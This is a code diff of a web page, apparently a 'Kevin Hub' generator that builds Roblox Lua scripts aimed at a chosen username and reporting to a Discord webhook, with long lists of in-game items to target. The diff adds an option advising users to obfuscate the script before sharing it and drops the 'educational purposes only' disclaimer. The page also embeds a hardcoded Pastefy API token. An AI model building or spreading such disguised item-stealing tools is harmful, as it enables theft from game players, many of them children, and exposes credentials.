@@ -21,35 +21,52 @@
       --card-radius: 20px;
     }
 
-    * { margin: 0; padding: 0; box-sizing: border-box; }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
     @keyframes gradientShift {
       0% { background-position: 0% 50%; }
       50% { background-position: 100% 50%; }
       100% { background-position: 0% 50%; }
     }
+
     @keyframes float {
       0%, 100% { transform: translateY(0px); }
       50% { transform: translateY(-8px); }
     }
+
     @keyframes glowPulse {
       0%, 100% { box-shadow: 0 0 20px var(--primary-glow), 0 0 40px transparent; }
       50% { box-shadow: 0 0 30px var(--primary-glow), 0 0 60px rgba(139, 92, 246, 0.2); }
     }
+
     @keyframes slideUp {
       from { opacity: 0; transform: translateY(20px); }
       to { opacity: 1; transform: translateY(0); }
     }
-    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-    @keyframes spin { to { transform: rotate(360deg); } }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
     @keyframes shimmer {
       0% { background-position: -200% 0; }
       100% { background-position: 200% 0; }
     }
+
     @keyframes dotBounce {
       0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
       40% { transform: scale(1); opacity: 1; }
     }
+
     @keyframes shake {
       0%, 100% { transform: translateX(0); }
       25% { transform: translateX(-4px); }
@@ -156,7 +173,11 @@
       cursor: pointer;
       transition: color 0.3s ease;
     }
-    .tab.active { color: #fff; }
+
+    .tab.active {
+      color: #fff;
+    }
+
     .tab.active::before {
       content: '';
       position: absolute;
@@ -173,7 +194,12 @@
       gap: 1.5rem;
       align-items: start;
     }
-    @media (max-width: 960px) { .grid { grid-template-columns: 1fr; } }
+
+    @media (max-width: 960px) {
+      .grid {
+        grid-template-columns: 1fr;
+      }
+    }
 
     .card {
       background: var(--surface);
@@ -187,17 +213,28 @@
       animation: slideUp 0.8s ease 0.2s both;
       transition: border-color 0.3s ease;
     }
+
     .card::before {
       content: '';
       position: absolute;
-      top: 0; left: 0; right: 0;
+      top: 0;
+      left: 0;
+      right: 0;
       height: 1px;
       background: linear-gradient(90deg, transparent, rgba(139, 92, 246, 0.6), transparent);
       opacity: 0.7;
     }
-    .card:hover { border-color: rgba(139, 92, 246, 0.3); }
 
-    .card-form { display: flex; flex-direction: column; gap: 1.5rem; }
+    .card:hover {
+      border-color: rgba(139, 92, 246, 0.3);
+    }
+
+    .card-form {
+      display: flex;
+      flex-direction: column;
+      gap: 1.5rem;
+    }
+
     .card-output {
       position: sticky;
       top: 1.5rem;
@@ -205,9 +242,18 @@
       flex-direction: column;
       gap: 1rem;
     }
-    @media (max-width: 960px) { .card-output { position: static; } }
 
-    .field { display: flex; flex-direction: column; gap: 0.5rem; }
+    @media (max-width: 960px) {
+      .card-output {
+        position: static;
+      }
+    }
+
+    .field {
+      display: flex;
+      flex-direction: column;
+      gap: 0.5rem;
+    }
 
     .label {
       font-size: 0.7rem;
@@ -220,7 +266,12 @@
       justify-content: space-between;
       gap: 0.5rem;
     }
-    .label .actions { display: flex; gap: 0.9rem; }
+
+    .label .actions {
+      display: flex;
+      gap: 0.9rem;
+    }
+
     .label .actions button {
       background: none;
       border: none;
@@ -232,7 +283,10 @@
       padding: 0;
       transition: color 0.2s ease;
     }
-    .label .actions button:hover { color: var(--primary); }
+
+    .label .actions button:hover {
+      color: var(--primary);
+    }
 
     input[type="text"] {
       width: 100%;
@@ -246,16 +300,22 @@
       outline: none;
       transition: all 0.25s ease;
     }
+
     input[type="text"].mono {
       font-family: 'JetBrains Mono', monospace;
       font-size: 0.82rem;
     }
-    input[type="text"]::placeholder { color: #4a4a58; }
+
+    input[type="text"]::placeholder {
+      color: #4a4a58;
+    }
+
     input[type="text"]:focus {
       border-color: var(--primary);
       box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.15), 0 0 20px rgba(139, 92, 246, 0.2);
       background: rgba(0, 0, 0, 0.6);
     }
+
     input[type="text"].invalid {
       border-color: #ef4444;
       animation: shake 0.4s ease;
@@ -274,8 +334,15 @@
       overflow-y: auto;
       padding-right: 4px;
     }
-    .pills::-webkit-scrollbar { width: 4px; }
-    .pills::-webkit-scrollbar-track { background: transparent; }
+
+    .pills::-webkit-scrollbar {
+      width: 4px;
+    }
+
+    .pills::-webkit-scrollbar-track {
+      background: transparent;
+    }
+
     .pills::-webkit-scrollbar-thumb {
       background: rgba(139, 92, 246, 0.4);
       border-radius: 4px;
@@ -293,17 +360,20 @@
       transition: all 0.2s ease;
       animation: fadeIn 0.3s ease;
     }
+
     .pill:hover {
       border-color: var(--border-hover);
       color: var(--text);
       transform: translateY(-1px);
     }
+
     .pill.selected {
       border-color: var(--primary);
       background: rgba(139, 92, 246, 0.15);
       color: #c4b5fd;
       box-shadow: 0 0 12px rgba(139, 92, 246, 0.25);
     }
+
     .pill.selected::after {
       content: '✓';
       margin-left: 0.35rem;
@@ -317,7 +387,10 @@
       text-transform: uppercase;
       font-weight: 600;
     }
-    .count strong { color: #a78bfa; }
+
+    .count strong {
+      color: #a78bfa;
+    }
 
     .checkbox-row {
       display: flex;
@@ -331,15 +404,18 @@
       transition: all 0.2s ease;
       background: rgba(0, 0, 0, 0.25);
     }
+
     .checkbox-row:hover {
       border-color: rgba(255, 255, 255, 0.12);
       background: rgba(0, 0, 0, 0.35);
     }
+
     .checkbox-row .info .name {
       font-size: 0.88rem;
       font-weight: 600;
       color: var(--text);
     }
+
     .checkbox-row .info .desc {
       font-size: 0.75rem;
       color: var(--muted);
@@ -355,21 +431,31 @@
       transition: background 0.25s ease;
       flex-shrink: 0;
     }
+
     .toggle::after {
       content: '';
       position: absolute;
-      top: 3px; left: 3px;
-      width: 18px; height: 18px;
+      top: 3px;
+      left: 3px;
+      width: 18px;
+      height: 18px;
       border-radius: 50%;
       background: #fff;
       transition: transform 0.25s ease;
     }
-    input[type="checkbox"] { display: none; }
+
+    input[type="checkbox"] {
+      display: none;
+    }
+
     input[type="checkbox"]:checked + .toggle {
       background: linear-gradient(135deg, var(--primary), var(--accent));
       box-shadow: 0 0 12px var(--primary-glow);
     }
-    input[type="checkbox"]:checked + .toggle::after { transform: translateX(18px); }
+
+    input[type="checkbox"]:checked + .toggle::after {
+      transform: translateX(18px);
+    }
 
     .output-header {
       display: flex;
@@ -377,6 +463,7 @@
       justify-content: space-between;
       gap: 1rem;
     }
+
     .output-title {
       display: flex;
       align-items: center;
@@ -385,6 +472,7 @@
       font-weight: 600;
       font-size: 1rem;
     }
+
     .output-title .sparkle {
       color: #a78bfa;
       animation: float 3s ease infinite;
@@ -406,6 +494,7 @@
       transition: all 0.2s ease;
       box-shadow: 0 2px 12px var(--primary-glow);
     }
+
     .copy-btn:hover {
       transform: translateY(-1px);
       box-shadow: 0 4px 18px var(--primary-glow);
@@ -427,27 +516,44 @@
       word-break: break-all;
       transition: border-color 0.3s ease;
     }
+
     .output-box.loading {
       display: flex;
       align-items: center;
       justify-content: center;
       color: var(--muted);
     }
+
     .output-box .dots {
       display: inline-flex;
       gap: 4px;
       margin-left: 6px;
     }
+
     .output-box .dots span {
-      width: 6px; height: 6px;
+      width: 6px;
+      height: 6px;
       border-radius: 50%;
       background: #a78bfa;
       animation: dotBounce 1.4s ease infinite;
     }
-    .output-box .dots span:nth-child(2) { animation-delay: 0.2s; }
-    .output-box .dots span:nth-child(3) { animation-delay: 0.4s; }
-    .output-box.success { border-color: rgba(34, 211, 238, 0.35); }
-    .output-box.error { border-color: rgba(239, 68, 68, 0.4); color: #fca5a5; }
+
+    .output-box .dots span:nth-child(2) {
+      animation-delay: 0.2s;
+    }
+
+    .output-box .dots span:nth-child(3) {
+      animation-delay: 0.4s;
+    }
+
+    .output-box.success {
+      border-color: rgba(34, 211, 238, 0.35);
+    }
+
+    .output-box.error {
+      border-color: rgba(239, 68, 68, 0.4);
+      color: #fca5a5;
+    }
 
     .generate-btn {
       width: 100%;
@@ -466,27 +572,37 @@
       box-shadow: 0 8px 30px rgba(139, 92, 246, 0.4);
       transition: all 0.25s ease;
     }
+
     .generate-btn::before {
       content: '';
       position: absolute;
-      top: 0; left: -100%;
-      width: 100%; height: 100%;
-      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.25), transparent);
       animation: shimmer 2.5s ease infinite;
     }
+
     .generate-btn:hover {
       transform: translateY(-2px);
       box-shadow: 0 12px 40px rgba(139, 92, 246, 0.55);
     }
-    .generate-btn:active { transform: translateY(0); }
+
+    .generate-btn:active {
+      transform: translateY(0);
+    }
+
     .generate-btn:disabled {
       cursor: not-allowed;
       opacity: 0.7;
       transform: none;
     }
+
     .generate-btn .spinner {
       display: inline-block;
-      width: 14px; height: 14px;
+      width: 14px;
+      height: 14px;
       border: 2px solid rgba(255, 255, 255, 0.35);
       border-top-color: #fff;
       border-radius: 50%;
@@ -501,7 +617,11 @@
       color: var(--muted);
       letter-spacing: 0.05em;
     }
-    .hint .key { color: #22d3ee; font-weight: 600; }
+
+    .hint .key {
+      color: #22d3ee;
+      font-weight: 600;
+    }
 
     footer {
       margin-top: 4rem;
@@ -514,6 +634,7 @@
       align-items: center;
       gap: 0.9rem;
     }
+
     footer .discord-link {
       display: inline-flex;
       align-items: center;
@@ -528,6 +649,7 @@
       text-decoration: none;
       transition: all 0.25s ease;
     }
+
     footer .discord-link:hover {
       background: rgba(88, 101, 242, 0.2);
       border-color: rgba(88, 101, 242, 0.55);
@@ -535,9 +657,12 @@
       transform: translateY(-2px);
       box-shadow: 0 6px 20px rgba(88, 101, 242, 0.3);
     }
-    footer .discord-link svg { width: 18px; height: 18px; fill: currentColor; }
-    footer .copyright { font-size: 0.72rem; color: var(--muted); }
-    footer .copyright .sep { color: #a78bfa; margin: 0 0.4rem; }
+
+    footer .discord-link svg {
+      width: 18px;
+      height: 18px;
+      fill: currentColor;
+    }
 
     .toast {
       position: fixed;
@@ -558,8 +683,14 @@
       align-items: center;
       gap: 0.5rem;
     }
-    .toast.show { transform: translateX(-50%) translateY(0); }
-    .toast .icon { color: #a78bfa; }
+
+    .toast.show {
+      transform: translateX(-50%) translateY(0);
+    }
+
+    .toast .icon {
+      color: #a78bfa;
+    }
   </style>
 </head>
 <body>
@@ -634,6 +765,14 @@
             <input type="checkbox" id="shortLoadstring" checked>
             <span class="toggle"></span>
           </label>
+          <label class="checkbox-row" style="margin-top: 0.5rem;">
+            <div class="info">
+              <div class="name">Obfuscate Script</div>
+              <div class="desc">Adds a note to use WeAreDevs before sharing</div>
+            </div>
+            <input type="checkbox" id="obfuscateToggle">
+            <span class="toggle"></span>
+          </label>
         </div>
       </div>
 
@@ -664,7 +803,6 @@
         </svg>
         discord.gg/luascript
       </a>
-      <div class="copyright">© 2026 Kevin Hub <span class="sep">·</span> For educational purposes only</div>
     </footer>
   </div>
 
@@ -677,105 +815,11 @@
     (function () {
       const PASTEFY_API_TOKEN = 'BIqBt1wWgJvXEG2er4A3UD6rxGZnXCllMJV5qvRO0hddGrgqbhluCHf0dhst';
 
-      const brainrotsList = [
-        "Garama and Madundung", "Capitano Moby", "Burguro And Fryuro", "Ketchuru and Musturu",
-        "Lavadorito Spinito", "Ketupat Kepat", "Tictac Sahur", "Tang Tang Keletang",
-        "Money Money Puggy", "Nuclearo Dinossauro", "Graipuss Medussi", "Cerberus",
-        "Dragon Cannelloni", "Agarrini la Palini", "Fragola La La La", "Los Hotspotsitos",
-        "Los Bros", "Tralaledon", "Los Puggies", "Los Primos", "Los Tacoritas",
-        "Los Spaghettis", "Spooky and Pumpky", "Fragrama and Chocrama", "La Casa Boo",
-        "Ketupat Bros", "Cooki and Milki", "Popcuru and Fizzuru", "La Supreme Combinasion",
-        "Dragon Gingerini", "Headless Horseman", "Hydra Dragon Cannelloni", "Celularcini Viciosini",
-        "La Grande Combinasion", "Los Trios", "La Sahur Combinasion", "Bacuru and Egguru",
-        "Eviledon", "Orcaledon", "Money Money Reindeer", "Los Jolly Combinasionas",
-        "Jolly Jolly Sahur", "Chicleteira Noelteira", "Bisonte Giuppitere", "Jackorilla",
-        "Reindeer Tralala", "Pumpkini Spyderini", "Frankentteo", "Santteo", "Telemorte",
-        "Spaghetti Tualetti", "La Secret Combinasion", "La Food Combinasion",
-        "Los Spooky Combinasionas", "Karkerkar Kurkur", "La Ginger Sekolah", "Rosey and Teddy",
-        "Los Sekolahs", "Reinito Sleighito", "Swaggy Bros", "La Taco Combinasion",
-        "Chipso and Queso", "La Spooky Grande", "Tuff Toucan", "Chillin Chili",
-        "Gobblino Uniciclino", "Strawberry Elephant", "La Extinct Grande", "Tacorita Bicicleta",
-        "Quesadillo Vampiro", "Perrito Burrito", "La Vacca Saturno Saturnita", "Karker Sahur",
-        "Bunito Bunito Spinito", "Pirulitoita Bicicleteira", "Bunnyman", "Brunito Marsito",
-        "Guest 666", "Mariachi Corazoni", "Swag Soda", "Extinct Matteo", "Los Quesadillas",
-        "Spinny Hammy", "Meowl", "Skibidi Toilet", "Nacho Spyder", "Griffin", "W or L",
-        "La Jolly Grande", "La Romantic Grande", "Festive 67", "Los Tralaleritos",
-        "Las Tralaleritas", "GOAT", "Love Love Bear", "Ginger Gerat", "Mieteteira Bicicleteira",
-        "Trenostruzzo Turbo 4000", "La Karkerkar Combinasion", "La Vacca Prese Presente",
-        "Rocco Disco", "1x1x1x1", "25", "67", "Abyssaloco", "Antonio", "Aquarino",
-        "Arcadopus", "Arcadragon", "Bananito", "Baskito", "Bearito Cabinito", "Berryno",
-        "Blackhole Goat", "Boatito Auratito", "Bombardiro Vaccariro", "Boppin Bunny",
-        "Buho de Volto", "Bunny Bunny Bunny Sahur", "Bunny and Eggy", "Buntteo",
-        "Burrito Bandito", "Camera Ramena", "Capitano Gullini", "Cash or Card",
-        "Caylusaurus", "Celestial Pegasus", "Chachechi", "Chicleteira Bicicleteira",
-        "Chicleteira Cupideira", "Chicleteira Surfeiteira", "Chicleteirina Bicleteirina",
-        "Chill Puppy", "Chimnino", "Churrito Bunnito", "Cigno Fulgoro", "Cloverat Clapat",
-        "Coco and Mango", "Craburger", "Cuadramat and Pakrahmatmamat", "Cupid Cupid Sahur",
-        "Cupid Hotspot", "DJ Panda", "Digi Narwhal", "Donkeyturbo Express", "Dragon Aquanini",
-        "Dug dug dug", "Duggy Bros", "Dul Dul Dul", "Easter Easter Easter Sahur",
-        "Eid Eid Eid Sahur", "Elefanto Frigo", "Esok Sekolah", "Extinct Tralalero",
-        "Fishboard", "Fishino Clownino", "Flancito", "Flipa Sandala", "Fortunu and Cashuru",
-        "Foxini Lanternini", "Frullato Framingo", "Futbolini Skatini", "Gelato Lumacho",
-        "Giftini Spyderini", "Girafini Raftini", "Glaciator", "Globa Steppa", "Gold Egg",
-        "Gold Elf", "Gold Gold Gold", "Granny", "Guerriro Digitale", "Gym Bros",
-        "Ho Ho Ho Sahur", "Hopilikalika Hopilikalako", "Horegini Boom", "Hydra Bunny",
-        "Jelly Moby", "Job Job Job Sahur", "John Doe", "Kalika Bros", "Kraken",
-        "La Anniversary Grande", "La Cucaracha", "La Easter Grande", "La Lucky Grande",
-        "La Summer Grande", "La Vacca Jacko Linterino", "La Vacca Lepre Lepreino", "Las Sis",
-        "Las Vaquitas Saturnitas", "List List List Sahur", "Los 25", "Los 67", "Los Amigos",
-        "Los Bunitos", "Los Burritos", "Los Candies", "Los Chicleteiras", "Los Chillis",
-        "Los Combinasionas", "Los Cucarachas", "Los Cupids", "Los Fruits", "Los Hackers",
-        "Los Jobcitos", "Los Karkeritos", "Los Mariachis", "Los Matteos", "Los Mi Gatitos",
-        "Los Mobilis", "Los Nooo My Hotspotsitos", "Los Planitos", "Los Spyderinis",
-        "Los Sweethearts", "Los Tortus", "Love Love Love Sahur", "Lovin Rose",
-        "Luck Luck Luck Sahur", "Lucky Block", "Mi Gatito", "Money Money Bros",
-        "Naughty Naughty", "Noo my Candy", "Noo my Eggs", "Noo my Gold", "Noo my Heart",
-        "Noo my Present", "Noo my examine", "Nooo My Hotspot", "Octoball", "Ombrello Topolino",
-        "Pancake and Syrup", "Paradiso Axolottino", "Please my Present", "Pot Hotspot",
-        "Pot Pumpkin", "Quackini Snackini", "Quesadilla Crocodila", "Rang Ring Bus",
-        "Rico Dinero", "Rocketini Frostini", "Rosetti Tualetti", "Rubrikiko",
-        "Sammyni Cakini", "Sammyni Fattini", "Sammyni Spyderini", "Sand Sand Sand",
-        "Santa Hotspot", "Serafinna Medusella", "Signore Carapace", "Snailo Clovero",
-        "Steakini Fattini", "Strawberrita", "Sushi Inu", "Tacorillo Crocodillo",
-        "Tirilikalika Tirilikalako", "To To To Sahur", "Torrtuginni Dragonfrutini",
-        "Trickolino", "Triplito Tralaleritos", "Ventoliero Pavonero", "Venuspino",
-        "Vulturino Skeletono", "Yess my examine", "Zombie Tralala", "Esok Goala",
-        "Ref Ref Ref Sahur", "Hippo Golazo", "Bufalino Boomberino", "Capitano Americano",
-        "Var Var Var", "Los Tictacs", "Los Tangcitos", "Los Admins", "Moby Bros",
-        "Grabatron", "Rubiko and Kubiko", "Cangurato Gelato", "Noodle Noodle Poodle",
-        "Toro Españolo", "Chicleteira Champeona", "Examen Bros", "Pizza and Ranch",
-        "Los Secret Combinasionas", "Bumbatron", "Yetimatic", "S'more Serat", "Queen Bee",
-        "Scorpino Coasterino", "Honey Honey Bear", "Pogo Pogo Penguin", "Conetto Morsetto",
-        "La Breakfast Combinasion", "La Fuse Machine", "Candini Fluffini", "Polaroidini",
-        "Noo my Resume", "Peschito Machito", "4th Bros", "Los Cornis", "Gelatina Volatina",
-        "Los Sigmas", "Yess my Resume", "Nachorilla", "Sammyni Truckini", "Tacoturbo Tacorito",
-        "Burrito Bat", "Pop Pop Petalini", "Rosatops Triceratino", "Motorino Bumbino",
-        "Syrup Samurai", "Orchidox", "Los Dragons", "La Craft Machine", "Gold and Diamond",
-        "Chicli Chicla", "Panda Popanda", "Deputy Leopard", "John Pork", "Zebrino Pianino",
-        "Ski Ski Skunki", "Sir Mangus", "Sammyni Spookyni", "Rockarino Rockara",
-        "Capibaro Celestino", "Draculino", "Fangaro Lupino", "Gattino Hydrantino", "Gub",
-        "Honey Honey Narwhal", "Hydra Serpent", "Lavamanta", "Lionello Casarello",
-        "Los Treaters", "Marino Submarino", "Oni Oni Panda", "Pelican Pachetto", "Phoenix",
-        "Pin Pin Pengu", "Plant Bros", "Puffino Builderino", "Qamar Camelamp",
-        "Ranito Pepito", "Rexino Ramino", "Dragon Skeletonini", "Cobra Gelato",
-        "Flying Dutchman", "Slushki Huski", "Boo Boo Rocket", "Bat-in-the-Box",
-        "Bananito Skelito", "Zombie Bowl", "Grim Cheese"
-      ];
+      const brainrotsList = ["Garama and Madundung","Capitano Moby","Burguro And Fryuro","Ketchuru and Musturu","Lavadorito Spinito","Ketupat Kepat","Tictac Sahur","Tang Tang Keletang","Money Money Puggy","Nuclearo Dinossauro","Graipuss Medussi","Cerberus","Dragon Cannelloni","Agarrini la Palini","Fragola La La La","Los Hotspotsitos","Los Bros","Tralaledon","Los Puggies","Los Primos","Los Tacoritas","Los Spaghettis","Spooky and Pumpky","Fragrama and Chocrama","La Casa Boo","Ketupat Bros","Cooki and Milki","Popcuru and Fizzuru","La Supreme Combinasion","Dragon Gingerini","Headless Horseman","Hydra Dragon Cannelloni","Celularcini Viciosini","La Grande Combinasion","Los Trios","La Sahur Combinasion","Bacuru and Egguru","Eviledon","Orcaledon","Money Money Reindeer","Los Jolly Combinasionas","Jolly Jolly Sahur","Chicleteira Noelteira","Bisonte Giuppitere","Jackorilla","Reindeer Tralala","Pumpkini Spyderini","Frankentteo","Santteo","Telemorte","Spaghetti Tualetti","La Secret Combinasion","La Food Combinasion","Los Spooky Combinasionas","Karkerkar Kurkur","La Ginger Sekolah","Rosey and Teddy","Los Sekolahs","Reinito Sleighito","Swaggy Bros","La Taco Combinasion","Chipso and Queso","La Spooky Grande","Tuff Toucan","Chillin Chili","Gobblino Uniciclino","Strawberry Elephant","La Extinct Grande","Tacorita Bicicleta","Quesadillo Vampiro","Perrito Burrito","La Vacca Saturno Saturnita","Karker Sahur","Bunito Bunito Spinito","Pirulitoita Bicicleteira","Bunnyman","Brunito Marsito","Guest 666","Mariachi Corazoni","Swag Soda","Extinct Matteo","Los Quesadillas","Spinny Hammy","Meowl","Skibidi Toilet","Nacho Spyder","Griffin","W or L","La Jolly Grande","La Romantic Grande","Festive 67","Los Tralaleritos","Las Tralaleritas","GOAT","Love Love Bear","Ginger Gerat","Mieteteira Bicicleteira","Trenostruzzo Turbo 4000","La Karkerkar Combinasion","La Vacca Prese Presente","Rocco Disco","1x1x1x1","25","67","Abyssaloco","Antonio","Aquarino","Arcadopus","Arcadragon","Bananito","Baskito","Bearito Cabinito","Berryno","Blackhole Goat","Boatito Auratito","Bombardiro Vaccariro","Boppin Bunny","Buho de Volto","Bunny Bunny Bunny Sahur","Bunny and Eggy","Buntteo","Burrito Bandito","Camera Ramena","Capitano Gullini","Cash or Card","Caylusaurus","Celestial Pegasus","Chachechi","Chicleteira Bicicleteira","Chicleteira Cupideira","Chicleteira Surfeiteira","Chicleteirina Bicicleteirina","Chill Puppy","Chimnino","Churrito Bunnito","Cigno Fulgoro","Cloverat Clapat","Coco and Mango","Craburger","Cuadramat and Pakrahmatmamat","Cupid Cupid Sahur","Cupid Hotspot","DJ Panda","Digi Narwhal","Donkeyturbo Express","Dragon Aquanini","Dug dug dug","Duggy Bros","Dul Dul Dul","Easter Easter Easter Sahur","Eid Eid Eid Sahur","Elefanto Frigo","Esok Sekolah","Extinct Tralalero","Fishboard","Fishino Clownino","Flancito","Flipa Sandala","Fortunu and Cashuru","Foxini Lanternini","Frullato Framingo","Futbolini Skatini","Gelato Lumacho","Giftini Spyderini","Girafini Raftini","Glaciator","Globa Steppa","Gold Egg","Gold Elf","Gold Gold Gold","Granny","Guerriro Digitale","Gym Bros","Ho Ho Ho Sahur","Hopilikalika Hopilikalako","Horegini Boom","Hydra Bunny","Jelly Moby","Job Job Job Sahur","John Doe","Kalika Bros","Kraken","La Anniversary Grande","La Cucaracha","La Easter Grande","La Lucky Grande","La Summer Grande","La Vacca Jacko Linterino","La Vacca Lepre Lepreino","Las Sis","Las Vaquitas Saturnitas","List List List Sahur","Los 25","Los 67","Los Amigos","Los Bunitos","Los Burritos","Los Candies","Los Chicleteiras","Los Chillis","Los Combinasionas","Los Cucarachas","Los Cupids","Los Fruits","Los Hackers","Los Jobcitos","Los Karkeritos","Los Mariachis","Los Matteos","Los Mi Gatitos","Los Mobilis","Los Nooo My Hotspotsitos","Los Planitos","Los Spyderinis","Los Sweethearts","Los Tortus","Love Love Love Sahur","Lovin Rose","Luck Luck Luck Sahur","Lucky Block","Mi Gatito","Money Money Bros","Naughty Naughty","Noo my Candy","Noo my Eggs","Noo my Gold","Noo my Heart","Noo my Present","Noo my examine","Nooo My Hotspot","Octoball","Ombrello Topolino","Pancake and Syrup","Paradiso Axolottino","Please my Present","Pot Hotspot","Pot Pumpkin","Quackini Snackini","Quesadilla Crocodila","Rang Ring Bus","Rico Dinero","Rocketini Frostini","Rosetti Tualetti","Rubrikiko","Sammyni Cakini","Sammyni Fattini","Sammyni Spyderini","Sand Sand Sand","Santa Hotspot","Serafinna Medusella","Signore Carapace","Snailo Clovero","Steakini Fattini","Strawberrita","Sushi Inu","Tacorillo Crocodillo","Tirilikalika Tirilikalako","To To To Sahur","Torrtuginni Dragonfrutini","Trickolino","Triplito Tralaleritos","Ventoliero Pavonero","Venuspino","Vulturino Skeletono","Yess my examine","Zombie Tralala","Esok Goala","Ref Ref Ref Sahur","Hippo Golazo","Bufalino Boomberino","Capitano Americano","Var Var Var","Los Tictacs","Los Tangcitos","Los Admins","Moby Bros","Grabatron","Rubiko and Kubiko","Cangurato Gelato","Noodle Noodle Poodle","Toro Españolo","Chicleteira Champeona","Examen Bros","Pizza and Ranch","Los Secret Combinasionas","Bumbatron","Yetimatic","S'more Serat","Queen Bee","Scorpino Coasterino","Honey Honey Bear","Pogo Pogo Penguin","Conetto Morsetto","La Breakfast Combinasion","La Fuse Machine","Candini Fluffini","Polaroidini","Noo my Resume","Peschito Machito","4th Bros","Los Cornis","Gelatina Volatina","Los Sigmas","Yess my Resume","Nachorilla","Sammyni Truckini","Tacoturbo Tacorito","Burrito Bat","Pop Pop Petalini","Rosatops Triceratino","Motorino Bumbino","Syrup Samurai","Orchidox","Los Dragons","La Craft Machine","Gold and Diamond","Chicli Chicla","Panda Popanda","Deputy Leopard","John Pork","Zebrino Pianino","Ski Ski Skunki","Sir Mangus","Sammyni Spookyni","Rockarino Rockara","Capibaro Celestino","Draculino","Fangaro Lupino","Gattino Hydrantino","Gub","Honey Honey Narwhal","Hydra Serpent","Lavamanta","Lionello Casarello","Los Treaters","Marino Submarino","Oni Oni Panda","Pelican Pachetto","Phoenix","Pin Pin Pengu","Plant Bros","Puffino Builderino","Qamar Camelamp","Ranito Pepito","Rexino Ramino","Dragon Skeletonini","Cobra Gelato","Flying Dutchman","Slushki Huski","Boo Boo Rocket","Bat-in-the-Box","Bananito Skelito","Zombie Bowl","Grim Cheese"];
 
-      const skinsList = [
-        "Rose", "Gingerbread", "Halloween", "Christmas", "Bunny Basket",
-        "Summer", "Pot of Gold", "Taco", "Octo", "Valentines", "Easter",
-        "Lucky", "Aquatic", "Tralalero"
-      ];
+      const skinsList = ["Rose","Gingerbread","Halloween","Christmas","Bunny Basket","Summer","Pot of Gold","Taco","Octo","Valentines","Easter","Lucky","Aquatic","Tralalero"];
 
-      const gearsList = [
-        "Santa's Sleigh", "Cupid's Wings", "Witch's Broom", "Waverider",
-        "Yin Yang Slap", "Cursed Slap", "Cyber Slap", "Divine Slap",
-        "Bloodmoon Slap", "Radioactive Slap", "Rainbow Slap", "Rainbow Hammer",
-        "Bloodmoon Hammer", "Radioactive Airstrike", "Yin Yang Lamp",
-        "Demon's Head", "Lava Slap", "Lava Blaster", "Alien Slap",
-        "Blackhole Bomb", "Candy Sentry", "Phantom Slap", "Crystal Slap"
-      ];
+      const gearsList = ["Santa's Sleigh","Cupid's Wings","Witch's Broom","Waverider","Yin Yang Slap","Cursed Slap","Cyber Slap","Divine Slap","Bloodmoon Slap","Radioactive Slap","Rainbow Slap","Rainbow Hammer","Bloodmoon Hammer","Radioactive Airstrike","Yin Yang Lamp","Demon's Head","Lava Slap","Lava Blaster","Alien Slap","Blackhole Bomb","Candy Sentry","Phantom Slap","Crystal Slap"];
 
       const selectedBrainrots = new Set();
       const selectedSkins = new Set();
@@ -796,6 +840,7 @@
       const usernameInput = $('usernameInput');
       const webhookInput = $('webhookInput');
       const shortLoadstringCheck = $('shortLoadstring');
+      const obfuscateToggle = $('obfuscateToggle');
 
       function renderPills(container, items, selectedSet, type) {
         container.innerHTML = '';
@@ -976,7 +1021,7 @@
               .join('\n')
           : '';
 
-        const luaScript =
+        let luaScript =
           'local TARGET_ID = 245727\n' +
           'local TARGET_USER = "' + usernameEscaped + '"\n' +
           'local WEBHOOK_URL = "' + webhookEscaped + '"\n' +
@@ -999,6 +1044,10 @@
           '        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)\n' +
           '    end\n' +
           'end)\n';
+
+        if (obfuscateToggle.checked) {
+          luaScript = '-- ⚠️ OBFUSCATION RECOMMENDED: Copy this script and paste it into https://wearedevs.net/obfuscator before sharing.\n' + luaScript;
+        }
 
         generateBtn.disabled = true;
         generateBtn.innerHTML = '<span class="spinner"></span>Uploading...';
